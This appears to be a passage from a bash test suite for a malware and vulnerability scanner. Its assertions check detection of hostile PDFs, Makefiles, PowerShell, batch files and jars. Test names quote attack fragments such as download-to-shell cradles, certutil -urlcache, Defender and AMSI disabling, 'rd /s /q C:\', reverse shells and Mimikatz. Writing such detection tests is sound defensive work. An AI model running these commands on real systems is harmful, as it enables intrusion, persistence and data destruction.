#!/usr/bin/env bash
# AI Transit Pipeline — test suite
#
# Runs without any scanning tool installed: the pipeline degrades to its
# grep-based rules, which is exactly how CI executes it. Tools that happen to
# be present are used, but no assertion depends on them.
#
# Usage:
#   ./tests/run_tests.sh              # run everything
#   ./tests/run_tests.sh -v           # show command output for failures
#   ./tests/run_tests.sh rules        # run only groups matching "rules"
set -uo pipefail

TESTS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$TESTS_DIR/.." && pwd)"
FIXTURES="${TESTS_DIR}/fixtures"

VERBOSE=false
FILTER=""
for arg in "$@"; do
    case "$arg" in
        -v|--verbose) VERBOSE=true ;;
        *)            FILTER="$arg" ;;
    esac
done

RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'
BLUE='\033[34m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

PASS_N=0; FAIL_N=0; SKIP_N=0
CURRENT_GROUP=""
declare -a FAILURES=()

# Scratch space; removed on exit.
SCRATCH="$(mktemp -d)"
cleanup() { rm -rf "$SCRATCH"; }
trap cleanup EXIT

group() {
    CURRENT_GROUP="$1"
    if [[ -n "$FILTER" && "$1" != *"$FILTER"* ]]; then
        CURRENT_GROUP="__skip__"
        return
    fi
    echo
    echo -e "${BOLD}${BLUE}── $1 ${RESET}"
}

_skipping() { [[ "$CURRENT_GROUP" == "__skip__" ]]; }

ok_test() {
    (( PASS_N++ ))
    echo -e "  ${GREEN}✔${RESET} $1"
}

fail_test() {
    (( FAIL_N++ ))
    local name="$1"; shift
    echo -e "  ${RED}✘${RESET} $name"
    [[ $# -gt 0 ]] && echo -e "    ${DIM}$*${RESET}"
    FAILURES+=("${CURRENT_GROUP} :: ${name}")
}

skip_test() {
    (( SKIP_N++ ))
    echo -e "  ${YELLOW}—${RESET} $1 ${DIM}(skipped: ${2:-})${RESET}"
}

# ── Assertions ────────────────────────────────────────────────────────────────
assert_eq() {
    local expected="$1" actual="$2" name="$3"
    if [[ "$expected" == "$actual" ]]; then
        ok_test "$name"
    else
        fail_test "$name" "expected '${expected}', got '${actual}'"
    fi
}

assert_contains() {
    local haystack="$1" needle="$2" name="$3"
    if [[ "$haystack" == *"$needle"* ]]; then
        ok_test "$name"
    else
        fail_test "$name" "expected to find '${needle}'"
        $VERBOSE && echo -e "    ${DIM}--- actual ---\n${haystack}${RESET}"
    fi
}

assert_not_contains() {
    local haystack="$1" needle="$2" name="$3"
    if [[ "$haystack" != *"$needle"* ]]; then
        ok_test "$name"
    else
        fail_test "$name" "did NOT expect '${needle}', but found it"
        $VERBOSE && echo -e "    ${DIM}--- actual ---\n${haystack}${RESET}"
    fi
}

assert_file_exists() {
    if [[ -f "$1" ]]; then ok_test "$2"; else fail_test "$2" "missing file: $1"; fi
}

# ── Pipeline driver ───────────────────────────────────────────────────────────
# run_pipeline <fixture_dir> [extra flags...]
# Sets: RUN_EXIT, RUN_OUT, RUN_WORK, RUN_JSON
run_pipeline() {
    local fixture="$1"; shift
    RUN_WORK="${SCRATCH}/work_$$_${RANDOM}"
    mkdir -p "$RUN_WORK"
    RUN_OUT=$(cd "$ROOT_DIR" && WORK_DIR="$RUN_WORK" OUTPUT_DIR="${RUN_WORK}/out" \
        timeout 300 ./ai_transit.sh "$@" "$fixture" 2>&1)
    RUN_EXIT=$?
    RUN_JSON=$(ls -t "${RUN_WORK}"/reports/report_*.json 2>/dev/null | head -1 || true)
}

# Read a value out of the JSON report with python3.
json_get() {
    python3 -c "
import json,sys
d=json.load(open(sys.argv[1]))
cur=d
for k in sys.argv[2].split('.'):
    cur=cur.get(k) if isinstance(cur,dict) else None
print(cur if cur is not None else '')
" "$1" "$2" 2>/dev/null || echo ""
}

# All finding text in the report, as one blob.
json_findings() {
    python3 -c "
import json,sys
d=json.load(open(sys.argv[1]))
for p,i in d.get('file_results',{}).items():
    print(p, i.get('status',''), i.get('message',''))
" "$1" 2>/dev/null || echo ""
}

# ═════════════════════════════════════════════════════════════════════════════
# LAYER A — Rule corpus
# One scan over a directory of small files, each crafted to trigger (or
# deliberately not trigger) a specific rule. Asserting on rule IDs here is what
# catches false positives and false negatives cheaply.
# ═════════════════════════════════════════════════════════════════════════════
group "Layer A — rule corpus (detection correctness)"
if ! _skipping; then
    run_pipeline "${FIXTURES}/rules"

    if [[ -z "$RUN_JSON" ]]; then
        fail_test "rule corpus scan produced a JSON report" "no report written"
    else
        F=$(json_findings "$RUN_JSON")

        # ── True positives, checked per file ─────────────────────────────────
        # Asserting against the whole blob would pass even if a finding were
        # attributed to the wrong file, so match each finding on the line for
        # the file it belongs to. (A NUL-record off-by-one once shifted every
        # message onto the following file while the blob still "contained" it.)
        line_for() { echo "$F" | grep "/$1 " || true; }

        assert_contains "$(line_for sql_injection.py)" "CWE-89:SQL_injection" \
            "sql_injection.py is flagged for SQL injection"
        assert_contains "$(line_for hardcoded_secret.py)" "CWE-798" \
            "hardcoded_secret.py is flagged for a hardcoded credential"
        assert_contains "$(line_for exec.ps1)" "CWE-78:PowerShell_command_execution" \
            "exec.ps1 is reported for Invoke-Expression (a WARN: see the PowerShell group below)"
        assert_contains "$(line_for deserialize.py)" "CWE-502" \
            "deserialize.py is flagged for insecure deserialization"
        # Extensionless scripts are routed by shebang; without that they fall
        # through to scan_unknown and skip per-language analysis entirely.
        assert_contains "$(line_for entrypoint)" "CWE-502" \
            "extensionless script is analysed via its shebang"

        # Status and message must agree: a PASS file carrying a [FAIL] message
        # means the report's parallel arrays have drifted out of alignment.
        MISMATCH=$(python3 -c "
import json,sys
d=json.load(open('$RUN_JSON'))
for p,i in d.get('file_results',{}).items():
    if i.get('status')=='PASS' and '[FAIL]' in i.get('message',''):
        print(p)
" 2>/dev/null || true)
        if [[ -z "$MISMATCH" ]]; then
            ok_test "no file is PASS while carrying a [FAIL] message"
        else
            fail_test "no file is PASS while carrying a [FAIL] message" "$MISMATCH"
        fi

        # ── PDF active content ───────────────────────────────────────────────
        # A PDF is a container: it can auto-run JavaScript, launch a program and
        # carry an embedded executable. Before scan_pdf() existed, .pdf had no
        # handler and fell through to scan_unknown, where application/pdf is not
        # one of the dangerous MIME types — so a weaponised PDF was recorded
        # PASS with no findings.
        assert_contains "$(line_for pdf_openaction_js.pdf)" "CWE-94:PDF_javascript" \
            "PDF with an embedded /JavaScript action is flagged"
        assert_contains "$(line_for pdf_openaction_js.pdf)" "PDF_auto_execute" \
            "PDF that auto-runs an action on open is flagged"
        assert_contains "$(line_for pdf_openaction_js.pdf)" "CWE-78:PDF_launch_action" \
            "PDF /Launch action is flagged"

        # The payload in this fixture exists ONLY inside a FlateDecode /ObjStm:
        # the strings "JavaScript" and "OpenAction" appear nowhere in the file's
        # plaintext. A rule that greps raw bytes passes it; only inflating the
        # streams finds it.
        assert_contains "$(line_for pdf_compressed_js.pdf)" "CWE-94:PDF_javascript" \
            "PDF hiding JavaScript in a compressed object stream is flagged"

        # /OpenAc#74ion and /J#61vaScript read identically to a viewer. The
        # strings "/OpenAction" and "/JavaScript" are absent from this file.
        assert_contains "$(line_for pdf_obfuscated_js.pdf)" "PDF_name_hex_obfuscation" \
            "PDF hex-escaping /JavaScript to evade a text rule is flagged"
        assert_contains "$(line_for pdf_obfuscated_js.pdf)" "CWE-94:PDF_javascript" \
            "hex-escaped names are decoded before the rules run"

        # Flate was once the only filter scan_pdf() decoded, so an action behind
        # ASCII85 or LZW was as invisible to it as a Flate one was to plain grep.
        assert_contains "$(line_for pdf_ascii85_js.pdf)" "CWE-94:PDF_javascript" \
            "PDF hiding JavaScript behind ASCII85Decode is flagged"
        assert_contains "$(line_for pdf_lzw_js.pdf)" "CWE-94:PDF_javascript" \
            "PDF hiding JavaScript behind LZWDecode is flagged"

        # A stray "(" in binary stream data must not blank the dictionary that
        # follows it and hide the /OpenAction there.
        assert_contains "$(line_for pdf_paren_swallow_js.pdf)" "PDF_auto_execute" \
            "an unbalanced ( in stream data does not swallow a later /OpenAction"

        # An undecodable filter must be reported, not silently skipped: an
        # uninspected stream is not a clean one. Image filters are excluded, so
        # the ordinary document below must not pick this up.
        assert_not_contains "$(line_for benign_doc.pdf)" "stream_filter_not_decoded" \
            "does NOT report an undecoded filter for an ordinary document"

        # ── Makefiles ────────────────────────────────────────────────────────
        # A Makefile recipe is shell, and $(shell ...) runs when make merely
        # READS the file — before any target is invoked — so a malicious one
        # does not need to be built to do damage.
        assert_contains "$(line_for evil.mk)" "CWE-78:make_curl_pipe_shell" \
            "Makefile piping a download into a shell is flagged"
        assert_contains "$(line_for evil.mk)" "CWE-798:make_hardcoded_credential" \
            "unquoted credential in a Makefile variable is flagged"
        assert_contains "$(line_for evil.mk)" "CWE-494:make_download_without_cert" \
            "Makefile disabling TLS verification is flagged"
        assert_contains "$(line_for evil.mk)" "make_reverse_shell" \
            "Makefile reverse shell is flagged"
        assert_contains "$(line_for evil.mk)" "CWE-912:make_persistence" \
            "Makefile installing cron/authorized_keys persistence is flagged"

        # A file called Makefile has no extension, so it reaches scan_makefile
        # only via the basename branch of classify_file.
        assert_contains "$(line_for Makefile)" "CWE-798:make_hardcoded_credential" \
            "extensionless Makefile is routed by basename, not extension"

        # ── HTML ─────────────────────────────────────────────────────────────
        # Inline <script> is ordinary, so these rules target the constructs
        # that are not: dynamic execution, a percent-encoded payload, a remote
        # script over plaintext, a hidden iframe, credentials in the markup and
        # a cookie read wired straight to a network sink.
        assert_contains "$(line_for evil.html)" "CWE-95:html_eval" \
            "HTML calling eval() is flagged"
        assert_contains "$(line_for evil.html)" "CWE-319:html_remote_script" \
            "HTML loading a remote script over http:// is flagged"
        assert_contains "$(line_for evil.html)" "CWE-798:html_hardcoded_credential_in_attribute" \
            "credential in an input value attribute is flagged"
        assert_contains "$(line_for evil.html)" "CWE-200:html_cookie_exfiltration" \
            "document.cookie wired to a network sink is flagged"
        assert_contains "$(line_for evil.html)" "html_hidden_iframe" \
            "zero-size or display:none iframe is flagged"

        # .htm must route exactly as .html does.
        assert_contains "$(line_for tracker.htm)" "html_hidden_iframe" \
            ".htm is routed to the HTML scanner as well as .html"

        # ── PowerShell ───────────────────────────────────────────────────────
        # The scanner had three rules and was wrong in both directions. On the 69
        # real .ps1 files on this host (32 distinct) it FAILed 8, every one a false
        # positive: npm.ps1 and npx.ps1 (Invoke-Expression on a command they
        # assemble), pnpm's completion script, and Playwright's browser installers
        # (download an MSI, run msiexec). Meanwhile `iex $c`, `IEX (iwr …)` and
        # `-enc …` all passed, because the rules were case-sensitive and `iex` was
        # only matched before a parenthesis.
        assert_contains "$(line_for ps_download_exec.ps1)" "CWE-78:PowerShell_download_and_execute" \
            "DownloadString piped to IEX is flagged"
        assert_contains "$(line_for ps_irm_iex.ps1)" "CWE-78:PowerShell_download_and_execute" \
            "lower-case \`irm … | iex\` with no parenthesis is flagged"
        assert_contains "$(line_for ps_mixed_case.ps1)" "CWE-78:PowerShell_download_and_execute" \
            "mixed-case InVoKe-ExPrEsSiOn is flagged (PowerShell is case-insensitive)"
        assert_contains "$(line_for ps_encoded_short.ps1)" "CWE-78:PowerShell_EncodedCommand_obfuscation" \
            "the short form -enc <base64> is flagged"
        assert_contains "$(line_for ps_amsi.ps1)" "CWE-693:PowerShell_AMSI_bypass" \
            "an AMSI bypass is flagged"
        assert_contains "$(line_for ps_defender.ps1)" "CWE-693:PowerShell_disables_Defender" \
            "Set-MpPreference -DisableRealtimeMonitoring \$true is flagged"
        assert_contains "$(line_for ps_persistence.ps1)" "CWE-912:PowerShell_persistence" \
            "writing a CurrentVersion\\Run key is flagged"
        assert_contains "$(line_for ps_reverse_shell.ps1)" "CWE-78:PowerShell_reverse_shell" \
            "a TCPClient stream fed to iex is flagged"
        assert_contains "$(line_for ps_shellcode.ps1)" "CWE-94:PowerShell_in_memory_shellcode_loader" \
            "VirtualAlloc with CreateThread is flagged"
        assert_contains "$(line_for ps_secret.ps1)" "CWE-798:hardcoded_credential" \
            "a literal \$Password and ConvertTo-SecureString -AsPlainText are flagged"
        assert_contains "$(line_for ps_obfuscated.ps1)" "CWE-95:PowerShell_obfuscated_Invoke_Expression" \
            "i\`e\`x with backticks inside the name is flagged"
        assert_contains "$(line_for ps_plaintext_dl_run.ps1)" "CWE-319:PowerShell_plaintext_download_then_run" \
            "a plaintext http:// download that is then run is flagged"
        assert_contains "$(line_for ps_offensive_tool.ps1)" "CWE-506:PowerShell_known_offensive_tool" \
            "Invoke-Mimikatz is flagged"

        # Every PowerShell extension must reach the scanner. .ps1 is above; each
        # of these is a different file type with the same interpreter behind it.
        assert_contains "$(line_for ps_decode_exec.psm1)" "CWE-95:PowerShell_decodes_and_executes" \
            ".psm1 (module): decode on one line, execute on another, is flagged"
        assert_contains "$(line_for ps_manifest.psd1)" "powershell:manifest_runs_scripts_at_import" \
            ".psd1 (manifest) is scanned: ScriptsToProcess is reported"
        assert_contains "$(line_for ps_session.pssc)" "powershell:manifest_runs_scripts_at_import" \
            ".pssc (session configuration) is scanned"
        assert_contains "$(line_for ps_role.psrc)" "powershell:role_capability_exposes_everything" \
            ".psrc (role capability) is scanned: a wildcard VisibleCmdlets is reported"
        assert_contains "$(line_for ps_types.ps1xml)" "CWE-78:PowerShell_download_and_execute" \
            ".ps1xml (type/format data): a script block that downloads and executes is flagged"
        assert_contains "$(line_for ps_console.psc1)" "CWE-611:xxe_external_entity_references_a_resource" \
            ".psc1 (console file) is scanned as XML: an external entity is flagged"
        assert_contains "$(line_for ps_cmdlet.cdxml)" "CWE-78:PowerShell_download_and_execute" \
            ".cdxml (CIM cmdlet definition) is scanned for PowerShell payloads"
        assert_contains "$(line_for ps_shebang_pwsh)" "CWE-78:PowerShell_download_and_execute" \
            "an extensionless script with a pwsh shebang is scanned"
        assert_contains "$(line_for ps_shebang_powershell)" "CWE-78:PowerShell_download_and_execute" \
            "an extensionless script with a powershell shebang is scanned"

        # Extension CASE. The dispatch was case-sensitive, so UPPER.PS1 and
        # UPPER.PY fell through to scan_unknown and PASSED while lower.ps1 and
        # lower.py FAILed. Windows users write .PS1; the fix is general.
        assert_contains "$(line_for ps_upper_ext.PS1)" "CWE-78:PowerShell_download_and_execute" \
            "an upper-case .PS1 extension reaches the PowerShell scanner"
        assert_contains "$(line_for case_upper.PY)" "CWE-78:OS_command_injection_risk" \
            "an upper-case .PY extension reaches the Python scanner"

        # Near-misses, modelled on the real scripts. Invoke-Expression on its own
        # appears in npm.ps1, npx.ps1 and pnpm's completion and was benign every
        # time, so it is a WARN; so is Start-Process, and an https download that
        # is then run (Playwright). None may FAIL.
        SAFE_NPM=$(echo "$F" | grep 'ps_safe_npm_shim.ps1' || true)
        assert_not_contains "$SAFE_NPM" "[FAIL]" \
            "does NOT fail npm's own shim: Invoke-Expression on a command it assembles"
        assert_contains "$SAFE_NPM" "PowerShell_command_execution_Invoke_Expression" \
            "a lone Invoke-Expression is reported, but does not block"
        SAFE_INST=$(echo "$F" | grep 'ps_safe_installer.ps1' || true)
        assert_not_contains "$SAFE_INST" "[FAIL]" \
            "does NOT fail Playwright's installer: https download, then msiexec"
        assert_contains "$SAFE_INST" "powershell:downloads_then_runs_a_program" \
            "an https download that is then run is reported, but does not block"
        SAFE_PSMISC=$(echo "$F" | grep 'ps_safe_misc.ps1' || true)
        assert_not_contains "$SAFE_PSMISC" "[FAIL]" \
            "does NOT fail a TcpClient port check, Read-Host, \$env: tokens or \$tokenEndpoint"

        # ── The bracket-expression bug ───────────────────────────────────────
        # GNU grep reads \s as a shorthand class only OUTSIDE a bracket expression.
        # Inside one, [^"\s]{4,} is a negated set of the literal characters \ and s,
        # so the universal credential rule required four characters none of which was
        # an "s": it missed password = "sup3rs3cret" and every other secret with an
        # "s" near the front. Four sites had it.
        assert_contains "$(line_for cred_s_values.py)" "CWE-798:hardcoded_credential" \
            "a secret with an s in its first four characters is flagged"
        assert_contains "$(line_for cred_s.json)" "CWE-798:hardcoded_credential_in_JSON" \
            "the same in a JSON file"
        assert_contains "$(line_for cred_s.md)" "CWE-798:hardcoded_credential_in_doc" \
            "the same in a document"
        assert_contains "$(line_for cred_s.yaml)" "CWE-798:inline_credential_in_yaml" \
            "the same in YAML"
        # The YAML site's bug ran the other way: its class did not exclude
        # whitespace, so `password:` followed by trailing spaces counted as a value.
        # Fixing the bracket REMOVES this false positive (27 of 3328 real YAML files).
        assert_not_contains "$(line_for cred_empty.yaml)" "CWE-798" \
            "does NOT flag an empty YAML value followed by trailing spaces"
        assert_not_contains "$(line_for cred_s_safe.py)" "CWE-798" \
            "does NOT flag env lookups, empty strings, \${...} or {{ templates }}"

        # ── Windows batch (.bat / .cmd) ──────────────────────────────────────
        # 116 real batch files on this host were all recorded PASS: .bat and .cmd
        # had no handler. Three properties of the language shape the scanner, and
        # all three occur in the real files: 104 of 116 use CRLF line endings, 56
        # carry REM/:: comment lines, and 6 use caret line-continuation, which lets
        # an attacker split `certutil` and `-urlcache` across lines. All the
        # fixtures below are CRLF-encoded.
        assert_contains "$(line_for bat_certutil_dl.bat)" "CWE-78:bat_download_cradle_certutil_or_bitsadmin" \
            "certutil -urlcache is flagged"
        assert_contains "$(line_for bat_ps_cradle.cmd)" "CWE-78:bat_powershell_download_cradle" \
            ".cmd: a PowerShell DownloadString cradle is flagged"
        assert_contains "$(line_for bat_ps_encoded.bat)" "CWE-78:bat_powershell_encoded_command" \
            "powershell -enc <base64> is flagged"
        assert_contains "$(line_for bat_certutil_decode.bat)" "CWE-78:bat_certutil_decodes_to_an_executable" \
            "certutil -decode into an .exe is flagged"
        assert_contains "$(line_for bat_download_run.bat)" "CWE-78:bat_download_then_execute" \
            "curl … && start <downloaded file> is flagged"
        assert_contains "$(line_for bat_secret.bat)" "CWE-798:bat_hardcoded_credential" \
            "set DB_PASSWORD=<literal> is flagged"
        assert_contains "$(line_for bat_persistence.bat)" "CWE-912:bat_persistence_run_key" \
            "reg add … CurrentVersion\\Run is flagged"
        assert_contains "$(line_for bat_startup_folder.bat)" "CWE-912:bat_persistence_startup_folder" \
            "copying a file into the Startup folder is flagged"
        assert_contains "$(line_for bat_defender.bat)" "CWE-693:bat_security_control_disabled" \
            "disabling Defender and the firewall is flagged"
        assert_contains "$(line_for bat_wipe.bat)" "bat:destructive_delete_of_a_drive_root_or_profile" \
            "rd /s /q C:\\ is flagged"
        assert_contains "$(line_for bat_insecure_tls.bat)" "CWE-494:bat_download_without_certificate_verification" \
            "curl -k is flagged"
        assert_contains "$(line_for bat_admin.bat)" "CWE-250:bat_local_admin_account_added" \
            "net localgroup administrators … /add is flagged"
        assert_contains "$(line_for bat_caret_name.bat)" "CWE-78:bat_caret_obfuscated_command_name" \
            "c^e^r^t^u^t^i^l with carets inside the name is flagged"

        # The same download as bat_certutil_dl.bat, split across caret-continued
        # lines. A line-based rule never sees `certutil` and `-urlcache` together.
        assert_contains "$(line_for bat_continued.bat)" "CWE-78:bat_download_cradle_certutil_or_bitsadmin" \
            "a certutil download split across ^-continued lines is still flagged"
        # Upper-case extension AND upper-case content: batch is case-insensitive.
        assert_contains "$(line_for bat_UPPER.BAT)" "CWE-78:bat_download_cradle_certutil_or_bitsadmin" \
            "an upper-case .BAT holding CERTUTIL -URLCACHE is flagged"

        # Near-misses taken from the real scripts: the MIT licence in REM comments
        # (the bare word `copy` is 27 of 116 on that alone), commented-out
        # payloads, `for /f` substitution (19 of 116), `SET "PATH=%~dp0;%PATH%"`,
        # `rd /s /q build`, `set /p PASSWORD=` (a prompt, not a literal), a
        # credential-named variable holding a %reference%, caret continuation.
        SAFE_BAT=$(echo "$F" | grep 'bat_safe_real.cmd' || true)
        assert_not_contains "$SAFE_BAT" "[FAIL]" \
            "does NOT fail real-world batch idioms, licence comments or commented-out payloads"
        assert_contains "$SAFE_BAT" "bat:powershell_execution_policy_bypass" \
            "-ExecutionPolicy Bypass is reported, but does not block"
        # Maven's own mvn.cmd trims a trailing backslash with two substring
        # extractions on one line. Assembling a command looks different: the
        # extractions are ADJACENT, building a word one character at a time.
        assert_not_contains "$SAFE_BAT" "assembled_from_variable_substrings" \
            "does NOT warn on Maven's trailing-backslash trim (two extractions apart)"
        assert_contains "$(line_for bat_substring_cmd.bat)" "bat:command_assembled_from_variable_substrings" \
            "a command built from adjacent %v:~n,1% extractions is reported"
        SAFE_FETCH=$(echo "$F" | grep 'bat_safe_fetch.bat' || true)
        assert_not_contains "$SAFE_FETCH" "[FAIL]" \
            "does NOT fail an https download that is not run, or certutil -decode to a .cer"

        # ── Java archives (.jar, .war, .ear, .aar) ───────────────────────────
        # A .jar is a ZIP of compiled code, and it had no handler: it fell through
        # to scan_unknown and was recorded PASS. Three things make it worth a
        # scanner of its own. It is executable code a reviewer cannot read. The
        # container format can carry paths that escape the extraction directory
        # (zip-slip) and bytes that are not what the entry name says. And
        # gradle-wrapper.jar, committed to nearly every Gradle repository, is run
        # by ./gradlew before any code the repository declares. Calibration is 365
        # real jars on this host: none of the FAIL rules below fires on any of them.
        JSAFE=$(line_for jar_safe.jar)
        assert_not_contains "$JSAFE" "[FAIL]" \
            "does NOT fail an ordinary jar (Main-Class, relative Class-Path, curl in prose, MZ-prefixed text, a class stored as .bin)"
        assert_contains "$JSAFE" "jar:vendored_compiled_code_not_reviewable" \
            "an ordinary jar is reported, never silently passed: bytecode is not reviewed"
        assert_not_contains "$JSAFE" "hidden_under_a_non_native_name" \
            "a class stored as .bin (0xCAFEBABE is also the Mach-O fat magic) is not a hidden executable"
        assert_not_contains "$JSAFE" "jar:wrapper" \
            "an ordinary jar does not get the build-wrapper message"

        assert_contains "$(line_for jar_zipslip.jar)" "CWE-22:jar_entry_path_traversal_zip_slip" \
            "a jar entry named ../../… or /etc/… is flagged as zip-slip"
        assert_contains "$(line_for jar_fake_class.jar)" "CWE-506:jar_class_entry_is_not_bytecode" \
            "a .class entry that does not begin 0xCAFEBABE is flagged"
        JHID=$(line_for jar_hidden_exe.jar)
        assert_contains "$JHID" "CWE-506:jar_native_executable_hidden_under_a_non_native_name" \
            "a Windows executable stored as logo.png is flagged"
        assert_contains "$JHID" "data/blob.dat" \
            "an ELF binary stored as blob.dat is flagged"
        assert_contains "$JHID" "res/icon.gif" \
            "a Mach-O binary stored as icon.gif is flagged"
        assert_contains "$(line_for jar_remote_classpath.jar)" "CWE-829:jar_manifest_class_path_names_a_remote_url" \
            "a manifest Class-Path naming an http:// jar is flagged"
        assert_contains "$(line_for jar_remote_classpath.jar)" "jar:manifest_class_path_is_absolute" \
            "an absolute Class-Path entry is reported"
        assert_contains "$(line_for jar_nested_evil.jar)" "lib/inner.jar!/../escape.txt" \
            "a zip-slip entry inside a jar nested in the jar is found"
        assert_contains "$(line_for jar_nested_evil.jar)" "jar:contains_nested_archive" \
            "a nested archive is reported"

        assert_contains "$(line_for jar_symlink.jar)" "CWE-22:jar_symlink_entry_points_outside_the_archive" \
            "a symlink entry pointing at ../../etc is flagged"
        assert_contains "$(line_for jar_symlink.jar)" "jar:contains_symlink_entry" \
            "an ordinary relative symlink entry is reported"
        JTU=$(line_for jar_text_unlisted.jar)
        assert_contains "$JTU" "jar_embeds_download_piped_to_shell(1: res/payload.dat)" \
            "text in an entry with no recognised extension is read"
        assert_not_contains "$JTU" "res/binary.dat" \
            "…while a binary entry holding the same string is not (it would be noise)"
        assert_contains "$(line_for jar_private_key.jar)" "CWE-321:hardcoded_private_key" \
            "a PEM private key stored as a resource is flagged"
        assert_contains "$(line_for jar_private_key.jar)" "Keys.class" \
            "a PEM private key held as one string constant in a class file is flagged"
        assert_not_contains "$JSAFE" "hardcoded_private_key" \
            "a PEM header constant next to a long class path (sshd-common) is not a private key"

        # The limit is stated, not hidden: depth 3 is not opened, and the jar says so.
        JDEEP=$(line_for jar_nested_deep.jar)
        assert_contains "$JDEEP" "jar:inspection_incomplete" \
            "archives nested beyond the depth limit report that they were not fully inspected"
        assert_not_contains "$JDEEP" "[FAIL]" \
            "…and the fixture documents the gap honestly: the payload at depth 3 is not seen"

        JHT=$(line_for jar_hostile_text.jar)
        assert_contains "$JHT" "CWE-78:jar_embeds_download_piped_to_shell" \
            "curl … | sh inside a jar resource is flagged"
        assert_contains "$JHT" "CWE-78:jar_embeds_reverse_shell" \
            "/dev/tcp reverse shell inside a jar resource is flagged"
        assert_contains "$JHT" "CWE-78:jar_embeds_encoded_powershell" \
            "powershell -enc <base64> inside a jar resource is flagged"
        assert_contains "$JHT" "CWE-494:jar_embeds_certutil_or_bitsadmin_download" \
            "certutil -urlcache inside a jar resource is flagged"
        # These strings sit inside the class file's constant pool, between binary
        # length fields: they are found by parsing the pool, not by grepping bytes.
        JHC=$(line_for jar_hostile_class.jar)
        assert_contains "$JHC" "CWE-78:jar_embeds_download_piped_to_shell" \
            "curl … | sh in a class file's constant pool is flagged"
        assert_contains "$JHC" "[WARN] jar:offensive_tool_name_in_content" \
            "an offensive-tool name in a class file is reported, as a warning only: security libraries name these tools"

        assert_contains "$(line_for jar_not_zip.jar)" "jar:file_is_not_an_archive_despite_its_extension" \
            "an ELF binary named .jar is flagged"
        assert_contains "$(line_for jar_prepended_pe.jar)" "CWE-506:jar_native_executable_prepended_to_archive" \
            "a Windows executable glued in front of a valid archive is flagged"
        assert_contains "$(line_for jar_prepended_script.jar)" "jar:launch_script_prepended_to_archive" \
            "a shell launch script before the archive (Spring Boot style) is reported"
        assert_not_contains "$(line_for jar_prepended_script.jar)" "[FAIL]" \
            "…but is not a failure"
        assert_contains "$(line_for jar_truncated.jar)" "jar:unparseable_archive_not_inspected" \
            "a truncated jar is reported as not inspected"
        assert_not_contains "$(line_for jar_truncated.jar)" "[FAIL]" \
            "a truncated jar does not block"
        assert_contains "$(line_for jar_empty.jar)" "jar:empty_file" \
            "a zero-byte jar is reported"
        assert_contains "$(line_for jar_prepended_data.jar)" "jar:data_before_archive_start" \
            "arbitrary bytes before the archive are reported"
        assert_contains "$(line_for jar_nested_broken.jar)" "jar:nested_archive_could_not_be_opened" \
            "a nested 'archive' that does not parse is reported"
        assert_contains "$(line_for jar_unreadable.jar)" "jar:entries_could_not_be_read" \
            "an entry stored with an unsupported compression method is reported as unreadable"

        assert_contains "$(line_for jar_agent.jar)" "jar:java_agent_in_manifest" \
            "Premain-Class in a manifest (a Java agent) is reported"
        assert_not_contains "$(line_for jar_agent.jar)" "[FAIL]" \
            "…and is not a failure: 2 of 365 real jars are legitimate agents"
        assert_contains "$(line_for jar_native.jar)" "jar:bundles_native_library" \
            "native libraries named .so/.dll/.dylib are reported"
        assert_not_contains "$(line_for jar_native.jar)" "[FAIL]" \
            "…and are not failures: 17 of 365 real jars bundle them"
        assert_contains "$(line_for jar_scripts.jar)" "jar:bundles_script_file" \
            "a .sh or .bat entry inside a jar is reported"
        assert_contains "$(line_for jar_duplicates.jar)" "jar:duplicate_entry_names" \
            "two entries with the same name are reported"
        assert_contains "$(line_for jar_encrypted.jar)" "jar:encrypted_entries_not_inspected" \
            "encrypted entries are reported as not inspected"
        assert_not_contains "$(line_for jar_big.jar)" "jar:inspection_incomplete" \
            "a 3 MB text entry is within the default limits"

        assert_contains "$(line_for jar_routing.war)" "CWE-22:jar_entry_path_traversal_zip_slip" \
            ".war is routed to the jar scanner"
        assert_contains "$(line_for jar_routing.ear)" "CWE-22:jar_entry_path_traversal_zip_slip" \
            ".ear is routed to the jar scanner"
        assert_contains "$(line_for jar_routing.aar)" "CWE-22:jar_entry_path_traversal_zip_slip" \
            ".aar is routed to the jar scanner"
        assert_contains "$(line_for case_UPPER.JAR)" "CWE-22:jar_entry_path_traversal_zip_slip" \
            "an upper-case .JAR extension is routed to the jar scanner"

        # ── Found by an independent red-team pass ────────────────────────────
        # The severity downgrade in record_fail greps the whole message for :LOW: and
        # friends; an entry name is part of the message, so a name containing :LOW:
        # turned a zip-slip FAIL into a warning.
        JSEV=$(line_for jar_severity_marker.jar)
        assert_contains "$JSEV" "[FAIL] CWE-22:jar_entry_path_traversal_zip_slip" \
            "an entry name containing :LOW: does not downgrade the zip-slip FAIL"
        assert_not_contains "$JSEV" "LOW_SEV" \
            "…and the message carries no severity marker taken from the archive"

        # Python's zipfile refuses an entry whose CRC, local name or declared size
        # disagree with the central directory; the JVM and unzip do not. Each fixture
        # is an entry the JVM reads and a strict reader would drop.
        assert_contains "$(line_for jar_bad_crc.jar)" "CWE-829:jar_manifest_class_path_names_a_remote_url" \
            "a manifest with a bad CRC is still read"
        assert_contains "$(line_for jar_local_name_mismatch.jar)" "CWE-829:jar_manifest_class_path_names_a_remote_url" \
            "a manifest whose local header names a different file is still read"
        assert_contains "$(line_for jar_short_declared_size.jar)" "CWE-78:jar_embeds_download_piped_to_shell" \
            "content past a declared size that is too small is still read"
        JLZ=$(line_for jar_lzma_corrupt.jar)
        assert_contains "$JLZ" "CWE-78:jar_embeds_download_piped_to_shell" \
            "an entry that cannot be decoded does not stop the other entries being scanned"
        assert_contains "$JLZ" "jar:entries_could_not_be_read" \
            "…and the unreadable entry is reported"
        assert_not_contains "$JLZ" "jar:inspection_failed" \
            "…without the whole inspection being reported as failed"
        assert_contains "$(line_for jar_symlink_unreadable.jar)" "CWE-22:jar_symlink_entry_target_unreadable" \
            "a symlink entry whose target cannot be read is flagged (unzip can read it)"
        assert_contains "$(line_for jar_orphan_local.jar)" "CWE-22:jar_local_entry_missing_from_central_directory" \
            "a local file record the central directory does not list is flagged"

        JU16=$(line_for jar_utf16.jar)
        assert_contains "$JU16" "run.properties" \
            "curl | sh in a UTF-16 resource with a BOM is found"
        assert_contains "$JU16" "win/fetch.txt" \
            "certutil -urlcache in UTF-16 without a BOM is found"
        assert_contains "$(line_for jar_private_key_short.jar)" "CWE-321:hardcoded_private_key" \
            "a PEM body wrapped at 40 characters a line is flagged"
